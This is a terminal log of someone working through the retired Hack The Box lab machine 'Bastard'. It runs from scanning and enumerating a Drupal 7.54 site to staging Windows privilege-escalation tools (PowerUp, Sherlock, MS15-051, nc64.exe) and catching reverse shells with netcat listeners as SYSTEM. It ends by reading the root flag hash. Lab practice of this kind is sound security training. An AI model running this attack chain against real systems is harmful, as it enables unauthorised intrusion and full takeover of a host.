arjun@broly:~/Documents/HacktheBox/retired/bastard$ vim nmap/initial.                                             
arjun@broly:~/Documents/HacktheBox/retired/bastard$ vim nmap/initial.nmap                                         
arjun@broly:~/Documents/HacktheBox/retired/bastard$ searchsploit drupal                                           
------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                           |  Path                                  
                                                                         | (/usr/share/exploitdb/)    
------------------------------------------------------------------------- ----------------------------------------
Drupal 4.0 - News Message HTML Injection                                 | exploits/php/webapps/21863.txt      
Drupal 4.1/4.2 - Cross-Site Scripting                                    | exploits/php/webapps/22940.txt      
Drupal 4.5.3 < 4.6.1 - Comments PHP Injection                            | exploits/php/webapps/1088.pl        
Drupal 4.7 - 'Attachment mod_mime' Remote Command Execution              | exploits/php/webapps/1821.php       
Drupal 4.x - URL-Encoded Input HTML Injection                            | exploits/php/webapps/27020.txt      
Drupal 5.2 - PHP Zend Hash ation Vector                                  | exploits/php/webapps/4510.txt       
Drupal 5.21/6.16 - Denial of Service                                     | exploits/php/dos/10826.sh  
Drupal 6.15 - Multiple Persistent Cross-Site Scripting Vulnerabilities   | exploits/php/webapps/11060.txt      
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)        | exploits/php/webapps/34992.py       
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session)         | exploits/php/webapps/44355.php      
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password)  | exploits/php/webapps/34984.py       
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password)  | exploits/php/webapps/34993.php      
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution) | exploits/php/webapps/35150.php      
Drupal 7.12 - Multiple Vulnerabilities                                   | exploits/php/webapps/18564.txt      
Drupal 7.x Module Services - Remote Code Execution                       | exploits/php/webapps/41564.php      
Drupal < 4.7.6 - Post Comments Remote Command Execution                  | exploits/php/webapps/3313.pl        
Drupal < 5.1 - Post Comments Remote Command Execution                    | exploits/php/webapps/3312.pl        
Drupal < 5.22/6.16 - Multiple Vulnerabilities                            | exploits/php/webapps/33706.txt      
Drupal < 7.34 - Denial of Service                                        | exploits/php/dos/35415.txt 
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit) | exploits/php/webapps/44557.rb       
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (P | exploits/php/webapps/44542.txt      
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Cod | exploits/php/webapps/44449.rb       
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Executi | exploits/php/remote/44482.rb        
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Executi | exploits/php/webapps/44448.py       
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote C | exploits/php/remote/46510.rb        
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution           | exploits/php/webapps/46452.txt      
Drupal < 8.6.9 - REST Module Remote Code Execution                       | exploits/php/webapps/46459.py       
Drupal Module Ajax Checklist 5.x-1.0 - Multiple SQL Injections           | exploits/php/webapps/32415.txt      
Drupal Module CAPTCHA - Security Bypass                                  | exploits/php/webapps/35335.html     
Drupal Module CKEditor 3.0 < 3.6.2 - Persistent EventHandler Cross-Site  | exploits/php/webapps/18389.txt      
Drupal Module CKEditor < 4.1WYSIWYG (Drupal 6.x/7.x) - Persistent Cross- | exploits/php/webapps/25493.txt      
Drupal Module CODER 2.5 - Remote Command Execution (Metasploit)          | exploits/php/webapps/40149.rb       
Drupal Module Coder < 7.x-1.3/7.x-2.6 - Remote Code Execution            | exploits/php/remote/40144.php       
Drupal Module Cumulus 5.x-1.1/6.x-1.4 - 'tagcloud' Cross-Site Scripting  | exploits/php/webapps/35397.txt      
Drupal Module Drag & Drop Gallery 6.x-1.5 - 'upload.php' Arbitrary File  | exploits/php/webapps/37453.php      
Drupal Module Embedded Media Field/Media 6.x : Video Flotsam/Media: Audi | exploits/php/webapps/35072.txt      
Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metasploit)        | exploits/php/remote/40130.rb        
Drupal Module Sections - Cross-Site Scripting                            | exploits/php/webapps/10485.txt      
Drupal Module Sections 5.x-1.2/6.x-1.2 - HTML Injection                  | exploits/php/webapps/33410.txt      
Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclosure        | exploits/php/webapps/44501.txt      
------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result       
arjun@broly:~/Documents/HacktheBox/retired/bastard$ searchsploit -x 3313.pl                                       
  Exploit: Drupal < 4.7.6 - Post Comments Remote Command Execution                                                
      URL: https://www.exploit-db.com/exploits/3313      
     Path: /usr/share/exploitdb/exploits/php/webapps/3313.pl                                                      
File Type: Perl script text executable                   



arjun@broly:~/Documents/HacktheBox/retired/bastard$ sudo nmap -T4 -p- -oA nmap/allports 10.10.10.9    
[sudo] password for arjun:  
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-13 16:04 CDT                                                   
Stats: 0:02:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan                                   
SYN Stealth Scan Timing: About 57.10% done; ETC: 16:08 (0:01:34 remaining)                                        
Stats: 0:02:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan                                   
SYN Stealth Scan Timing: About 57.24% done; ETC: 16:08 (0:01:33 remaining)                                        
Nmap scan report for 10.10.10.9                          
Host is up (0.078s latency).                             
Not shown: 65532 filtered ports                          
PORT      STATE SERVICE     
80/tcp    open  http        
135/tcp   open  msrpc       
49154/tcp open  unknown     

Nmap done: 1 IP address (1 host up) scanned in 215.93 seconds                                                     
arjun@broly:~/Documents/HacktheBox/retired/bastard$ drop 
dropdb    droplang  dropuser                             
arjun@broly:~/Documents/HacktheBox/retired/bastard$ dro  
droopescan  dropdb      droplang    dropuser             
arjun@broly:~/Documents/HacktheBox/retired/bastard$ droopescan -help                                              
Traceback (most recent call last):                       
  File "/usr/local/bin/droopescan", line 3, in <module>  
    from dscan import droopescan                         
  File "/usr/local/lib/python2.7/dist-packages/dscan/droopescan.py", line 4, in <module>                          
    from cement.core import backend, foundation, controller, handler                                              
ImportError: No module named cement.core                 
arjun@broly:~/Documents/HacktheBox/retired/bastard$ droopescan --help                                             
Traceback (most recent call last):                       
  File "/usr/local/bin/droopescan", line 3, in <module>  
    from dscan import droopescan                         
  File "/usr/local/lib/python2.7/dist-packages/dscan/droopescan.py", line 4, in <module>                          
    from cement.core import backend, foundation, controller, handler                                              
ImportError: No module named cement.core                 
arjun@broly:~/Documents/HacktheBox/retired/bastard$ sudo apt install cement                                       
Reading package lists... Done                            
Building dependency tree                                 
Reading state information... Done                        
E: Unable to locate package cement                       
arjun@broly:~/Documents/HacktheBox/retired/bastard$ sudo python -m pip install cement                             
/usr/share/python-wheels/pkg_resources-0.0.0-py3-none-any.whl/pkg_resources/py2_warn.py:21: UserWarning: Setuptools will stop working on Python 2
************************************************************                                                      
You are running Setuptools on Python 2, which is no longer                                                        
supported and               
>>> SETUPTOOLS WILL STOP WORKING <<<                     
in a subsequent release (no sooner than 2020-04-20).     
Please ensure you are installing                         
Setuptools using pip 9.x or later or pin to `setuptools<45`                                                       
in your environment.        
If you have done those things and are still encountering 
this message, please follow up at                        
https://bit.ly/setuptools-py2-warning.                   
************************************************************                                                      
DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. A future version of pip will drop support for Python 2.7. More details about Python 2 support in pip, can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support
Collecting cement           
  Downloading cement-3.0.0.tar.gz (232 kB)               
     |████████████████████████████████| 232 kB 4.6 MB/s  
    ERROR: Command errored out with exit status 1:       
     command: /usr/bin/python -c 'import sys, setuptools, tokenize; sys.argv[0] = '"'"'/tmp/pip-install-b67zHZ/cement/setup.py'"'"'; __file__='"'"'/tmp/pip-install-b67zHZ/cement/setup.py'"'"';f=getattr(tokenize, '"'"'open'"'"', open)(__file__);code=f.read().replace('"'"'\r\n'"'"', '"'"'\n'"'"');f.close();exec(compile(code, __file__, '"'"'exec'"'"'))' egg_info --egg-base /tmp/pip-install-b67zHZ/cement/pip-egg-info
         cwd: /tmp/pip-install-b67zHZ/cement/            
    Complete output (13 lines):                          
    Traceback (most recent call last):                   
      File "<string>", line 1, in <module>               
      File "/tmp/pip-install-b67zHZ/cement/setup.py", line 4, in <module>                                         
        from cement.utils import version                 
      File "cement/__init__.py", line 4, in <module>     
        from .core.foundation import App, TestApp        
      File "cement/core/foundation.py", line 8, in <module>                                                       
        from ..core import exc, log, config, plugin      
      File "cement/core/log.py", line 8, in <module>     
        from ..core.interface import Interface           
      File "cement/core/interface.py", line 5, in <module>                                                        
        from abc import ABC 
    ImportError: cannot import name ABC                  
    ----------------------------------------             
ERROR: Command errored out with exit status 1: python setup.py egg_info Check the logs for full command output.
arjun@broly:~/Documents/HacktheBox/retired/bastard$ sudo python -m pip install abc                                
/usr/share/python-wheels/pkg_resources-0.0.0-py3-none-any.whl/pkg_resources/py2_warn.py:21: UserWarning: Setuptools will stop working on Python 2
************************************************************                                                      
You are running Setuptools on Python 2, which is no longer                                                        
supported and               
>>> SETUPTOOLS WILL STOP WORKING <<<                     
in a subsequent release (no sooner than 2020-04-20).     
Please ensure you are installing                         
Setuptools using pip 9.x or later or pin to `setuptools<45`                                                       
in your environment.        
If you have done those things and are still encountering 
this message, please follow up at                        
https://bit.ly/setuptools-py2-warning.                   
************************************************************                                                      
DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. A future version of pip will drop support for Python 2.7. More details about Python 2 support in pip, can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support
ERROR: Could not find a version that satisfies the requirement abc (from versions: none)                          
ERROR: No matching distribution found for abc            
arjun@broly:~/Documents/HacktheBox/retired/bastard$ sudo python -m pip install cement                             
/usr/share/python-wheels/pkg_resources-0.0.0-py3-none-any.whl/pkg_resources/py2_warn.py:21: UserWarning: Setuptools will stop working on Python 2
************************************************************                                                      
You are running Setuptools on Python 2, which is no longer                                                        
supported and               
>>> SETUPTOOLS WILL STOP WORKING <<<                     
in a subsequent release (no sooner than 2020-04-20).     
Please ensure you are installing                         
Setuptools using pip 9.x or later or pin to `setuptools<45`                                                       
in your environment.        
If you have done those things and are still encountering 
this message, please follow up at                        
https://bit.ly/setuptools-py2-warning.                   
************************************************************                                                      
DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. A future version of pip will drop support for Python 2.7. More details about Python 2 support in pip, can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support
Collecting cement           
  Using cached cement-3.0.0.tar.gz (232 kB)              
    ERROR: Command errored out with exit status 1:       
     command: /usr/bin/python -c 'import sys, setuptools, tokenize; sys.argv[0] = '"'"'/tmp/pip-install-KtEOTz/cement/setup.py'"'"'; __file__='"'"'/tmp/pip-install-KtEOTz/cement/setup.py'"'"';f=getattr(tokenize, '"'"'open'"'"', open)(__file__);code=f.read().replace('"'"'\r\n'"'"', '"'"'\n'"'"');f.close();exec(compile(code, __file__, '"'"'exec'"'"'))' egg_info --egg-base /tmp/pip-install-KtEOTz/cement/pip-egg-info
         cwd: /tmp/pip-install-KtEOTz/cement/            
    Complete output (13 lines):                          
    Traceback (most recent call last):                   
      File "<string>", line 1, in <module>               
      File "/tmp/pip-install-KtEOTz/cement/setup.py", line 4, in <module>                                         
        from cement.utils import version                 
      File "cement/__init__.py", line 4, in <module>     
        from .core.foundation import App, TestApp        
      File "cement/core/foundation.py", line 8, in <module>                                                       
        from ..core import exc, log, config, plugin      
      File "cement/core/log.py", line 8, in <module>     
        from ..core.interface import Interface           
      File "cement/core/interface.py", line 5, in <module>                                                        
        from abc import ABC 
    ImportError: cannot import name ABC                  
    ----------------------------------------             
ERROR: Command errored out with exit status 1: python setup.py egg_info Check the logs for full command output.
arjun@broly:~/Documents/HacktheBox/retired/bastard$ sudo python -m pip install droopescan                         
/usr/share/python-wheels/pkg_resources-0.0.0-py3-none-any.whl/pkg_resources/py2_warn.py:21: UserWarning: Setuptools will stop working on Python 2
************************************************************                                                      
You are running Setuptools on Python 2, which is no longer                                                        
supported and               
>>> SETUPTOOLS WILL STOP WORKING <<<                     
in a subsequent release (no sooner than 2020-04-20).     
Please ensure you are installing                         
Setuptools using pip 9.x or later or pin to `setuptools<45`                                                       
in your environment.        
If you have done those things and are still encountering 
this message, please follow up at                        
https://bit.ly/setuptools-py2-warning.                   
************************************************************                                                      
DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. A future version of pip will drop support for Python 2.7. More details about Python 2 support in pip, can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support
Requirement already satisfied: droopescan in /usr/local/lib/python2.7/dist-packages (1.41.3)                      
Collecting cement<2.6.99,>=2.6                           
  Downloading cement-2.6.2.tar.gz (140 kB)               
     |████████████████████████████████| 140 kB 4.9 MB/s  
Collecting futures          
  Downloading futures-3.3.0-py2-none-any.whl (16 kB)     
Collecting pystache         
  Downloading pystache-0.5.4.tar.gz (75 kB)              
     |████████████████████████████████| 75 kB 3.1 MB/s   
Requirement already satisfied: requests in /usr/local/lib/python2.7/dist-packages (from droopescan) (2.23.0)   
Requirement already satisfied: urllib3!=1.25.0,!=1.25.1,<1.26,>=1.21.1 in /usr/local/lib/python2.7/dist-packages (from requests->droopescan) (1.25.9)
Requirement already satisfied: certifi>=2017.4.17 in /usr/local/lib/python2.7/dist-packages (from requests->droopescan) (2020.4.5.1)
Requirement already satisfied: chardet<4,>=3.0.2 in /usr/lib/python2.7/dist-packages (from requests->droopescan) (3.0.4)
Requirement already satisfied: idna<3,>=2.5 in /usr/local/lib/python2.7/dist-packages (from requests->droopescan) (2.9)
Building wheels for collected packages: cement, pystache 
  Building wheel for cement (setup.py) ... done          
  Created wheel for cement: filename=cement-2.6.2-py2-none-any.whl size=81071 sha256=f80534f17099762c350447d2ed57f26935addd5b506c9dee4cc99504b1397e77
  Stored in directory: /root/.cache/pip/wheels/17/c9/6c/65bddd00101ba71f3844b841b411d858254a51cdf5ae6edbc0     
  Building wheel for pystache (setup.py) ... done        
  Created wheel for pystache: filename=pystache-0.5.4-py2-none-any.whl size=82948 sha256=426746f13b7cd06478bef88edf07b9038e28477a3fc2c52990ae59a2afb47828
  Stored in directory: /root/.cache/pip/wheels/9c/0e/86/45067ea34fc026fe8dbb5162eb78c49b71d0f84f7b683ee042     
Successfully built cement pystache                       
Installing collected packages: cement, futures, pystache 
Successfully installed cement-2.6.2 futures-3.3.0 pystache-0.5.4                                                  
arjun@broly:~/Documents/HacktheBox/retired/bastard$ dro  
droopescan  dropdb      droplang    dropuser             
arjun@broly:~/Documents/HacktheBox/retired/bastard$ which droopescan                                              
/usr/local/bin/droopescan   
arjun@broly:~/Documents/HacktheBox/retired/bastard$ droopescan --help                                             
usage: droopescan (sub-commands ...) [options ...] {arguments ...}                                                

    |                       
 ___| ___  ___  ___  ___  ___  ___  ___  ___  ___        
|   )|   )|   )|   )|   )|___)|___ |    |   )|   )       
|__/ |    |__/ |__/ |__/ |__   __/ |__  |__/||  /        
                    |       
=================================================        

commands:                   

  scan                      
    cms scanning functionality.                          

  stats                     
    shows scanner status & capabilities.                 

optional arguments:         
  -h, --help  show this help message and exit            
  --debug     toggle debug output                        
  --quiet     suppress all output                        

Example invocations:        
  droopescan scan drupal -u URL_HERE                     
  droopescan scan silverstripe -u URL_HERE               

More info:                  
  droopescan scan --help    
                            
Please see the README file for information regarding proxies.                                                     
arjun@broly:~/Documents/HacktheBox/retired/bastard$ droopescan scan --help                                        
usage: droopescan (sub-commands ...) [options ...] {arguments ...}                                                

cms scanning functionality. 

commands:                   

  drupal                    
    drupal related scanning tools                        

  joomla                    
    joomla related scanning tools                        

  moodle                    
    Moodle scanner          

  silverstripe              
    silverstripe related scanning tools                  

  wordpress                 
    wordpress related scanning tools                     

optional arguments:         
  -h, --help            show this help message and exit  
  --debug               toggle debug output              
  --quiet               suppress all output              
  -u URL, --url URL         
  -U URL_FILE, --url-file URL_FILE                       
                        A file which contains a list of URLs.                                                     
  --enumerate {a,i,p,t,v}, -e {a,i,p,t,v}                
                        What to enumerate; default is all available, options are:                                 
                            p - plugins                  
                            t - themes                   
                            v - version                  
                            i - interesting urls         
                            a - all                      
  --method {not_found,ok,forbidden}                      
                        Some webservers respond with 403 when a folder exists. Others with a 404.     
                        Others with a 200; default is to determine.                                               
  --verb {head,get}     The HTTP verb to use; the default option is head,                                         
                        except for version enumeration requests, which are                                        
                        always get because we need to get the hash from the                                       
                        file's contents                  
  --number NUMBER, -n NUMBER                             
                        Number of words to attempt from the plugin/theme                                          
                        dictionary. Default is 1000. Use -n 'all' to use all                                      
                        available.                       
  --plugins-base-url PLUGINS_BASE_URL                    
                        Location where the plugins are stored by the CMS.                                         
                        Default is the CMS' default location. First %s in                                         
                        string will be replaced with the url, and the second                                      
                        one will be replaced with the module name. E.g.                                           
                        '%ssites/all/modules/%s/'        
  --themes-base-url THEMES_BASE_URL                      
                        Same as above, but for themes.   
  --timeout TIMEOUT     How long to wait for an HTTP response before timing                                       
                        out (in seconds).                
  --timeout-host TIMEOUT_HOST                            
                        Maximum time to spend per host (in seconds).                                              
  --no-follow-redirects     
                        Prevent the following of redirects.                                                       
  --host HOST           Override host header with this value.                                                     
  --massscan-override   Overrides defaults with defaults convenient for mass-                                     
                        scanning of hosts.               
  --threads THREADS, -t THREADS                          
                        Number of threads. Default 4.    
  --threads-identify THREADS_IDENTIFY                    
                        Number of threads used for CMS identification.                                            
  --threads-scan THREADS_SCAN                            
                        Threads used for mass scanning.  
  --threads-enumerate THREADS_ENUMERATE                  
                        Threads used for plugin enumeration.                                                      
  --output {json,standard}, -o {json,standard}           
                        Output format                    
  --hide-progressbar    Hide progressbar                 
  --debug-requests      Prints every HTTP request made and the response                                           
                        returned from the server for debugging purposes.                                          
                        Disables threading and loading bars.                                                      
  --error-log ERROR_LOG     
                        A file to store the errors on.   
  --resume              Resume the url_file scan as of the last known scanned                                     
                        url. Must be used in conjunction with --error-log.                                        

Example invocations:        
  droopescan scan drupal -u URL_HERE                     
  droopescan scan silverstripe -u URL_HERE               

More info:                  
  droopescan scan --help    
                            
Please see the README file for information regarding proxies.                                                     
arjun@broly:~/Documents/HacktheBox/retired/bastard$ droopescan scan droopscan drupal -u http://10.10.10.9/     
usage: droopescan (sub-commands ...) [options ...] {arguments ...}                                                
droopescan: error: unrecognized arguments: droopscan drupal                                                       
arjun@broly:~/Documents/HacktheBox/retired/bastard$ droopescan scan drupal -u http://10.10.10.9/                  
[+] Themes found:                                                                                                 
    seven http://10.10.10.9/themes/seven/                
    garland http://10.10.10.9/themes/garland/            

[+] Possible interesting urls found:                     
    Default changelog file - http://10.10.10.9/CHANGELOG.txt                                                      
    Default admin - http://10.10.10.9/user/login         

[+] Possible version(s):    
    7.54                    

[+] Plugins found:          
    ctools http://10.10.10.9/sites/all/modules/ctools/   
        http://10.10.10.9/sites/all/modules/ctools/CHANGELOG.txt                                                  
        http://10.10.10.9/sites/all/modules/ctools/changelog.txt                                                  
        http://10.10.10.9/sites/all/modules/ctools/CHANGELOG.TXT                                                  
        http://10.10.10.9/sites/all/modules/ctools/LICENSE.txt                                                    
        http://10.10.10.9/sites/all/modules/ctools/API.txt                                                        
    libraries http://10.10.10.9/sites/all/modules/libraries/                                                      
        http://10.10.10.9/sites/all/modules/libraries/CHANGELOG.txt                                               
        http://10.10.10.9/sites/all/modules/libraries/changelog.txt                                               
        http://10.10.10.9/sites/all/modules/libraries/CHANGELOG.TXT                                               
        http://10.10.10.9/sites/all/modules/libraries/README.txt                                                  
        http://10.10.10.9/sites/all/modules/libraries/readme.txt                                                  
        http://10.10.10.9/sites/all/modules/libraries/README.TXT                                                  
        http://10.10.10.9/sites/all/modules/libraries/LICENSE.txt                                                 
    services http://10.10.10.9/sites/all/modules/services/                                                        
        http://10.10.10.9/sites/all/modules/services/README.txt                                                   
        http://10.10.10.9/sites/all/modules/services/readme.txt                                                   
        http://10.10.10.9/sites/all/modules/services/README.TXT                                                   
        http://10.10.10.9/sites/all/modules/services/LICENSE.txt                                                  
    image http://10.10.10.9/modules/image/               
    profile http://10.10.10.9/modules/profile/           
    php http://10.10.10.9/modules/php/                   

[+] Scan finished (0:48:31.394158 elapsed)               
arjun@broly:~/Documents/HacktheBox/retired/bastard$ locate PowerUp.ps1                                            
/usr/lib/python3/dist-packages/cme/data/powersploit/Privesc/PowerUp.ps1                                           
/usr/share/powershell-empire/data/module_source/privesc/PowerUp.ps1                                               
/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1                                                      
arjun@broly:~/Documents/HacktheBox/retired/bastard$ cp /usr/share/powershell-empire/data/module_source/privesc/PowerUp.ps1 .
arjun@broly:~/Documents/HacktheBox/retired/bastard$ vim PowerUp.ps1                                               
arjun@broly:~/Documents/HacktheBox/retired/bastard$ cp /opt/                                                      
.cisco/         droopescan/     kingsoft/       microsoft/      Signal/                                           
cisco/          gobuster/       libreoffice6.2/ resolve/        win_privesc/                                      
containerd/     gradle/         linux_privesc/  shell/          zoom/                                             
arjun@broly:~/Documents/HacktheBox/retired/bastard$ cp /opt/win_privesc/Sherlock/Sherlock.ps1 .       
arjun@broly:~/Documents/HacktheBox/retired/bastard$ vim Sherlock.ps1                                              
arjun@broly:~/Documents/HacktheBox/retired/bastard$ vim Sherlock.ps1                                              
arjun@broly:~/Documents/HacktheBox/retired/bastard$ vim Sherlock.ps1                                              
arjun@broly:~/Documents/HacktheBox/retired/bastard$ ls   
41564.php  notes.ctb   notes.ctb~~   PowerUp.ps1   shell.ps1     user.json                                        
nmap       notes.ctb~  notes.ctb~~~  session.json  Sherlock.ps1  :wq                                              
arjun@broly:~/Documents/HacktheBox/retired/bastard$ vim Sherlock.ps1                                              
arjun@broly:~/Documents/HacktheBox/retired/bastard$ cp /usr/share/powershell-empire/                              
data/    empire   lib/     plugins/ setup/   VERSION     
arjun@broly:~/Documents/HacktheBox/retired/bastard$ cp /usr/share/powershell-empire/data/module_source/privesc/   
Get-GPPPassword.ps1                    Invoke-MS16032.ps1                                                         
Get-SiteListPassword.ps1               Invoke-MS16135.ps1                                                         
Get-System.ps1                         Invoke-SDCLTBypass.ps1                                                     
Invoke-BypassUAC.ps1                   Invoke-Tater.ps1  
Invoke-BypassUACTokenManipulation.ps1  Invoke-WScriptBypassUAC.ps1                                                
arjun@broly:~/Documents/HacktheBox/retired/bastard$ unzip MS15-051-KB3045171.zip                                  
Archive:  MS15-051-KB3045171.zip                         
  End-of-central-directory signature not found.  Either this file is not                                          
  a zipfile, or it constitutes one disk of a multi-part archive.  In the                                          
  latter case the central directory and zipfile comment will be found on                                          
  the last disk(s) of this archive.                      
unzip:  cannot find zipfile directory in one of MS15-051-KB3045171.zip or                                         
        MS15-051-KB3045171.zip.zip, and cannot find MS15-051-KB3045171.zip.ZIP, period.                           
arjun@broly:~/Documents/HacktheBox/retired/bastard$ ls   
41564.php               nmap       notes.ctb~   notes.ctb~~~  session.json  Sherlock.ps1  :wq                     
MS15-051-KB3045171.zip  notes.ctb  notes.ctb~~  PowerUp.ps1   shell.ps1     user.json                             
arjun@broly:~/Documents/HacktheBox/retired/bastard$ rm :wq                                                        
arjun@broly:~/Documents/HacktheBox/retired/bastard$ unzip MS15-051-KB3045171.zip                                  
Archive:  MS15-051-KB3045171.zip                         
  End-of-central-directory signature not found.  Either this file is not                                          
  a zipfile, or it constitutes one disk of a multi-part archive.  In the                                          
  latter case the central directory and zipfile comment will be found on                                          
  the last disk(s) of this archive.                      
unzip:  cannot find zipfile directory in one of MS15-051-KB3045171.zip or                                         
        MS15-051-KB3045171.zip.zip, and cannot find MS15-051-KB3045171.zip.ZIP, period.                           
arjun@broly:~/Documents/HacktheBox/retired/bastard$ unzip MS15-051-KB3045171                                      
Archive:  MS15-051-KB3045171.zip                         
  End-of-central-directory signature not found.  Either this file is not                                          
  a zipfile, or it constitutes one disk of a multi-part archive.  In the                                          
  latter case the central directory and zipfile comment will be found on                                          
  the last disk(s) of this archive.                      
unzip:  cannot find zipfile directory in one of MS15-051-KB3045171 or                                             
        MS15-051-KB3045171.zip, and cannot find MS15-051-KB3045171.ZIP, period.                                   
arjun@broly:~/Documents/HacktheBox/retired/bastard$ ls   
41564.php           MS15-051-KB3045171.zip  notes.ctb   notes.ctb~~   PowerUp.ps1   shell.ps1     user.json       
MS15-051-KB3045171  nmap                    notes.ctb~  notes.ctb~~~  session.json  Sherlock.ps1                  
arjun@broly:~/Documents/HacktheBox/retired/bastard$ cd MS15-051-KB3045171/                                        
arjun@broly:~/Documents/HacktheBox/retired/bastard/MS15-051-KB3045171$ ls                                         
ms15-051.exe  ms15-051x64.exe  Source                    
arjun@broly:~/Documents/HacktheBox/retired/bastard/MS15-051-KB3045171$ cp ms15-051x64.exe ..                      
arjun@broly:~/Documents/HacktheBox/retired/bastard/MS15-051-KB3045171$ cd .                                       
arjun@broly:~/Documents/HacktheBox/retired/bastard/MS15-051-KB3045171$ cd ..                                      
arjun@broly:~/Documents/HacktheBox/retired/bastard$ ls   
41564.php           MS15-051-KB3045171.zip  nmap       notes.ctb~   notes.ctb~~~  session.json  Sherlock.ps1      
MS15-051-KB3045171  ms15-051x64.exe         notes.ctb  notes.ctb~~  PowerUp.ps1   shell.ps1     user.json         
arjun@broly:~/Documents/HacktheBox/retired/bastard$ nc -lvnp 9002                                                 
listening on [any] 9002 ... 
^C                          
arjun@broly:~/Documents/HacktheBox/retired/bastard$ unzip netcat-win32-1.11.zip                                   
Archive:  netcat-win32-1.11.zip                          
  inflating: netcat-1.11/doexec.c                        
  inflating: netcat-1.11/generic.h                       
  inflating: netcat-1.11/getopt.c                        
  inflating: netcat-1.11/getopt.h                        
  inflating: netcat-1.11/hobbit.txt                      
  inflating: netcat-1.11/license.txt                     
  inflating: netcat-1.11/Makefile                        
  inflating: netcat-1.11/nc.exe                          
  inflating: netcat-1.11/nc64.exe                        
  inflating: netcat-1.11/netcat.c                        
  inflating: netcat-1.11/readme.txt                      
arjun@broly:~/Documents/HacktheBox/retired/bastard$ cp netcat-1.11/nc64.exe .                                     
arjun@broly:~/Documents/HacktheBox/retired/bastard$      
arjun@broly:~/Documents/HacktheBox/retired/bastard$ nc -lvnp 9002                                                 
listening on [any] 9002 ... 
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.9] 57479                                                        
Windows PowerShell          
Copyright (C) 2009 Microsoft Corporation. All rights reserved.                                                    

ls                          
^C                          
arjun@broly:~/Documents/HacktheBox/retired/bastard$ nc -lvnp 9002                                                 
listening on [any] 9002 ... 
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.9] 57480                                                        
Microsoft Windows [Version 6.1.7600]                     
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.                                                   

C:\inetpub\drupal-7.54>whoami                            
whoami                      
nt authority\system         

C:\inetpub\drupal-7.54>cd C:\Users                       
cd C:\Users                 

C:\Users>dir                
dir                         
 Volume in drive C has no label.                         
 Volume Serial Number is 605B-4AAA                       

 Directory of C:\Users      

19/03/2017  08:35     <DIR>          .                   
19/03/2017  08:35     <DIR>          ..                  
19/03/2017  02:20     <DIR>          Administrator       
19/03/2017  02:54     <DIR>          Classic .NET AppPool                                                         
19/03/2017  08:35     <DIR>          dimitris            
14/07/2009  07:57     <DIR>          Public              
               0 File(s)              0 bytes            
               6 Dir(s)  30.793.883.648 bytes free       

C:\Users>cd Administrator\Desktop                        
cd Administrator\Desktop    

C:\Users\Administrator\Desktop>dir                       
dir                         
 Volume in drive C has no label.                         
 Volume Serial Number is 605B-4AAA                       

 Directory of C:\Users\Administrator\Desktop             

19/03/2017  08:33     <DIR>          .                   
19/03/2017  08:33     <DIR>          ..                  
19/03/2017  08:34                 32 root.txt.txt        
               1 File(s)             32 bytes            
               2 Dir(s)  30.793.883.648 bytes free       

C:\Users\Administrator\Desktop>type root.txt.txt         
type root.txt.txt           
4bf12b963da1b30cc93496f617f7ba7c                         
C:\Users\Administrator\Desktop>exit                      
arjun@broly:~/Documents/HacktheBox/retired/bastard$      
